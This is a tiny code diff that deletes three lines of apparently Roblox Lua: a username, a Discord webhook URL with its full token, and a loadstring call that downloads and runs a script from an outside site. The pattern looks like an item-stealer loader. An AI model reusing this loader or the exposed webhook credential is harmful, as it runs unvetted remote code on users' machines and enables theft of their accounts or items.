@@ -1,3 +1,0 @@
-UserName = "toodlestoots3"
-Webhook = "https://discord.com/api/webhooks/1090380804405858374/L5lhRWX0a9VCS43UAYJwbQdU8w02qfeyIN1IWt96n6asjJWWabLvuOu1BrWZVK_Lh2L_"
-loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
